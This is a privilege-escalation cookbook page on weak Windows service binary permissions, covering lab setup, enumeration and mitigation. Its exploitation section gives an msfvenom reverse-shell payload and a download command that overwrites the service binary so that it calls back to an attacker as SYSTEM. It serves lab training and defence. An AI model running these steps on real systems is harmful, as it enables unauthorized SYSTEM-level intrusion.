# Weak Service Binary Permissions

[Back to Main](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#vulnerabilities)

## Table of Contents

- [Weak Service Binary Permissions](#weak-service-binary-permissions)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

Weak Service Binary Permissions indicate a vulnerability due to insufficient permissions on service executables. This vulnerability can be exploited by an adversary to modify the service executable, granting unauthorized access or potentially elevating system privileges.

## Lab Setup

### Manual Lab Setup

1) Open a PowerShell with local Administrtor Privileges and use the following command to create a new folder:

```
mkdir "C:\Program Files\CustomSrv2\"
```

2) Download the file [Service2.exe](/Lab-Setup-Binary/Service2.exe) to the 'C:\Program Files\CustomSrv2' directory.

3) Grant modify privileges to BUILTIN\Users for the service folder:

```
icacls "C:\Program Files\CustomSrv2\Service2.exe" /grant BUILTIN\Users:M
```

4) Install the new Service:

```
New-Service -Name "Vulnerable Service 2" -BinaryPathName "C:\Program Files\CustomSrv2\Service2.exe" -DisplayName "Vuln Service 2" -Description "My Custom Vulnerable Service 2" -StartupType Automatic
```

5) Edit new service's permissions to be controlled by BUILTIN\Users:

```
cmd.exe /c 'sc sdset "Vulnerable Service 2" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;BU)'
```

Outcome:

![Weak-Service-Binary-Manual-Lab-Setup](/Pictures/Weak-Service-Binary-Manual-Lab-Setup.png)

5) Verify the new service (services.msc):

![Weak-Service-Binary-Manual-Lab-Setup-Verify](/Pictures/Weak-Service-Binary-Manual-Lab-Setup-Verify.png)

6) Manually start the service from the service panel, or reboot the machine due to the service is set to start automatically upon machine boot.

:information_source: If you want to unistall the new service use the following command:

```
Remove-Service -Name "Vulnerable Service 2"
```

### PowerShell Script Lab Setup

To set up the lab with the 'Weak Service Binary Permissions' vulnerability is by using the custom PowerShell script named [WeakServiceBinaryPermissions.ps1](/Lab-Setup-Scripts/WeakServiceBinaryPermissions.ps1).

1) Open a PowerShelll with local Administrator privileges and run the script:

```
.\WeakServiceBinaryPermissions.ps1
```

Outcome:

![Weak-Service-Binary-Script-Lab-Setup](/Pictures/Weak-Service-Binary-Script-Lab-Setup.png)

2) Manually start the service from the service panel, or reboot the machine due to the service is set to start automatically upon machine boot.

:information_source: If you want to unistall the new service use the following command:

```
Remove-Service -Name "Vulnerable Service 2"
```

## Enumeration

### Manual Enumeration

To perform manual enumeration of the `Weak Service Binary Permissions` vulnerability, you can use the following steps:

1) Open a command prompt and use the following command to enumerate the permissions of the service binary:

```
icacls "C:\Program Files\CustomSrv2\Service2.exe"
```

Outcome:

![Weak-Service-Binary-Manual-Enumeration](/Pictures/Weak-Service-Binary-Manual-Enumeration.png)

2) Use the following command to find out the `START_TYPE` and `SERVICE_START_NAME`:

```
sc qc "Vulnerable Service 2"
```

Outcome:

![Weak-Service-Binary-Manual-Enumeration-Part-2](/Pictures/Weak-Service-Binary-Manual-Enumeration-Part-2.png)

3) Use the following command to find out the `STATE` and it's attributes:

```
sc query "Vulnerable Service 2"
```

Outcome:

![Weak-Service-Binary-Manual-Enumeration-Part-3](/Pictures/Weak-Service-Binary-Manual-Enumeration-Part-3.png)

:information_source: Finally, as you can see: 

- The BUILTIN\Users can modify the Service2.exe.
- The service automatically starts after machine boots.
- The Local System runs the service.
- The service is running.

### Tool Enumeration

To run the SharpUp tool and perform an enumeration of the `Weak Service Binary Permissions` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit ModifiableServiceBinaries
```

Outcome:

![Weak-Service-Binary-Tool-Enumeration](/Pictures/Weak-Service-Binary-Tool-Enumeration.png)

## Exploitation

To abuse this vulnerability you should follow these steps:

1) If the service is running and you have permissions to stop it:

```
sc stop "Vulnerable Service 2"
```

Outcome:

![Weak-Service-Binary-Exploitaion-Part-1](/Pictures/Weak-Service-Binary-Exploitaion-Part-1.png)

2) Create with msfvenom a malicious exe file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service2.exe
```

3) Open a listener in your kali machine.

4) Transfer and overwrite the Service2.exe file with the malicious binary:

```
iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Files\CustomSrv2\Service2.exe
```

5) Start the service with the following command or reboot the machine:

```
sc start "Vulnerable Service 2"
```

6) Verify the reverse shell on your Kali machine:

![Weak-Service-Binary-Permissions-Reverse-Shell](/Pictures/Weak-Service-Binary-Permissions-Reverse-Shell.png)

## Mitigation

To defend against Weak Service Binary Permissions vulnerabilities, adjust permissions on Service executables initiated through this mechanism. This limits unauthorized access and strengthens security measures:

```
icacls "C:\Program Files\CustomSrv2\Service2.exe" /remove:g BUILTIN\Users:(M)
```

## References

- [Introduction to Windows Services applications Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications)
- [Hot to Create Windows Services Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/how-to-create-windows-services)
- [Access Control Overview Microsoft](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/access-control)
- [Establishing Windows File and Folder Level Permissions by UWEC](https://www.uwec.edu/kb/article/drives-establishing-windows-file-and-folder-level-permissions/)
